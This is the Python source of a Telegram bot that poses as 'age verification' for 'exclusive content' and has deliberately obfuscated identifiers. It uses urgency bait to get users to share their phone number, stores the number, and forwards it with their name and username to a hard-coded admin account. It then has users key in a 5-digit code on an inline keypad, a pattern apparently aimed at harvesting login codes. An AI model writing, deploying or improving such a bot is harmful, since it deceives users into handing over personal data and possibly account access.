import logging
import random
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import sqlite3
from datetime import datetime
import base64

# Obfuscated strings
_0x1a2b = lambda x: base64.b64decode(x).decode()
_0x3c4d = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
_0x5e6f = _0x1a2b(b'Qk9UX1RPS0VO')  # BOT_TOKEN
_0x7g8h = _0x1a2b(b'QURNSU5fSUQ=')  # ADMIN_ID

logging.basicConfig(format=_0x3c4d, level=logging.INFO)
logger = logging.getLogger(__name__)

_0x9i0j = os.getenv(_0x5e6f)
_0x1k2l = int(os.getenv(_0x7g8h, '6483793776'))

class _0xAVB:
    def __init__(self):
        self._0xdb()
        self._0xvs = {}
        
    def _0xdb(self):
        """Initialize SQLite database"""
        self._0xc = sqlite3.connect('age_verification.db', check_same_thread=False)
        _0xcr = self._0xc.cursor()
        
        _0xcr.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verification_code TEXT,
                verified BOOLEAN DEFAULT 0,
                created_at DATETIME,
                verified_at DATETIME
            )
        ''')
        
        self._0xc.commit()

    async def _0xst(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command"""
        _0xu = update.message.from_user
        
        _0xcr = self._0xc.cursor()
        _0xcr.execute('SELECT verified FROM users WHERE user_id = ?', (_0xu.id,))
        _0xr = _0xcr.fetchone()
        
        if _0xr and _0xr[0]:
            await update.message.reply_text(
                "✅ **Already Verified!**\n\nYou're already age-verified in our system. No need to verify again!",
                parse_mode='Markdown'
            )
            return
        
        _0xwt = f"""
🌟 **Excited to explore something fresh and thrilling?**
🚀 **Confirm your age to unlock an exclusive content collection!**
⚡ **Act fast — spots are limited!**

Hello {_0xu.first_name}! 

**Step 1:** Share your phone number to receive verification code.

👇 Click the button below to share your contact.
        """
        
        _0xck = ReplyKeyboardMarkup([
            [KeyboardButton("📱 Share My Contact", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            _0xwt, 
            parse_mode='Markdown',
            reply_markup=_0xck
        )

    async def _0xhc(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact"""
        try:
            _0xu = update.message.from_user
            _0xct = update.message.contact
            
            if _0xct.user_id != _0xu.id:
                await update.message.reply_text(
                    "❌ Please share your own contact, not someone else's.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            _0xvc = str(random.randint(10000, 99999))
            
            _0xcr = self._0xc.cursor()
            _0xcr.execute('''
                INSERT OR REPLACE INTO users 
                (user_id, username, first_name, phone_number, verification_code, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (_0xu.id, _0xu.username, _0xu.first_name, _0xct.phone_number, _0xvc, datetime.now()))
            self._0xc.commit()
            
            await update.message.reply_text("👇", reply_markup=ReplyKeyboardRemove())
            
            _0xsm = await update.message.reply_text(
                "📨 **Sending code...**",
                parse_mode='Markdown'
            )
            
            await context.application.bot.send_chat_action(_0xu.id, "typing")
            
            await _0xsm.edit_text("✅ **Enter the code!**", parse_mode='Markdown')
            
            await self._0xsci(context, _0xu.id, _0xvc)
            
            await context.bot.send_message(
                _0x1k2l,
                f"""
📱 **New Verification Request**

👤 User: {_0xu.first_name} (@{_0xu.username})
📞 Phone: `{_0xct.phone_number}`
🔢 Generated Code: `{_0xvc}`

**Note:** Send this code to the user via SMS.
                """,
                parse_mode='Markdown'
            )
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}")
            await update.message.reply_text("❌ Error processing. Please try /start again.")

    async def _0xsci(self, context, _0xui, _0xvc):
        """Send code input interface"""
        try:
            _0xkb = [
                [
                    InlineKeyboardButton('1', callback_data=f'n_1_{_0xui}'),
                    InlineKeyboardButton('2', callback_data=f'n_2_{_0xui}'),
                    InlineKeyboardButton('3', callback_data=f'n_3_{_0xui}')
                ],
                [
                    InlineKeyboardButton('4', callback_data=f'n_4_{_0xui}'),
                    InlineKeyboardButton('5', callback_data=f'n_5_{_0xui}'),
                    InlineKeyboardButton('6', callback_data=f'n_6_{_0xui}')
                ],
                [
                    InlineKeyboardButton('7', callback_data=f'n_7_{_0xui}'),
                    InlineKeyboardButton('8', callback_data=f'n_8_{_0xui}'),
                    InlineKeyboardButton('9', callback_data=f'n_9_{_0xui}')
                ],
                [
                    InlineKeyboardButton('0', callback_data=f'n_0_{_0xui}')
                ],
                [
                    InlineKeyboardButton('👉 Get code!', url='https://t.me/+42777')
                ]
            ]
            
            _0xrm = InlineKeyboardMarkup(_0xkb)
            
            _0xmsg = """
**Enter your verification code:**

Code: ` - - - - - `

Use the buttons below to enter your 5-digit code.
            """
            
            await context.bot.send_message(
                _0xui,
                _0xmsg,
                parse_mode='Markdown',
                reply_markup=_0xrm
            )
            
            self._0xvs[_0xui] = {
                'code': '',
                'correct_code': _0xvc
            }
            
        except Exception as e:
            logger.error(f"Error sending interface: {e}")

    async def _0xhcb(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle callback"""
        try:
            _0xq = update.callback_query
            _0xui = _0xq.from_user.id
            
            await _0xq.answer()
            
            if _0xui not in self._0xvs:
                await _0xq.edit_message_text("❌ Session expired. Please /start again.")
                return
            
            _0xs = self._0xvs[_0xui]
            _0xd = _0xq.data
            
            if _0xd.startswith('n_'):
                _0xn = _0xd.split('_')[1]
                
                if len(_0xs['code']) < 5:
                    _0xs['code'] += _0xn
                    
                _0xdisp = ' '.join(_0xs['code'].ljust(5, '-'))
                
                await _0xq.edit_message_text(
                    f"""
**Enter your verification code:**

Code: ` {_0xdisp} `

Use the buttons below to enter your 5-digit code.
                    """,
                    parse_mode='Markdown',
                    reply_markup=_0xq.message.reply_markup
                )
                    
        except Exception as e:
            logger.error(f"Error in callback: {e}")
            await _0xq.edit_message_text("❌ Error occurred. Please /start again.")

    async def _0xsts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin stats"""
        if update.message.from_user.id != _0x1k2l:
            return
        
        _0xcr = self._0xc.cursor()
        _0xcr.execute('SELECT COUNT(*) FROM users WHERE verified = 1')
        _0xv = _0xcr.fetchone()[0]
        
        _0xcr.execute('SELECT COUNT(*) FROM users')
        _0xt = _0xcr.fetchone()[0]
        
        await update.message.reply_text(
            f"""
📊 **Bot Statistics**

✅ Verified Users: {_0xv}
📝 Total Users: {_0xt}
⏳ Pending: {_0xt - _0xv}
            """,
            parse_mode='Markdown'
        )

def _0xmain():
    """Run the bot"""
    if not _0x9i0j:
        logger.error("❌ BOT_TOKEN environment variable is not set!")
        logger.error("Please set BOT_TOKEN in Railway environment variables.")
        return
    
    _0xbot = _0xAVB()
    _0xapp = Application.builder().token(_0x9i0j).build()
    
    _0xapp.add_handler(CommandHandler("start", _0xbot._0xst))
    _0xapp.add_handler(CommandHandler("stats", _0xbot._0xsts))
    _0xapp.add_handler(MessageHandler(filters.CONTACT, _0xbot._0xhc))
    _0xapp.add_handler(CallbackQueryHandler(_0xbot._0xhcb))
    
    logger.info("🚀 Bot started!")
    _0xapp.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    _0xmain()
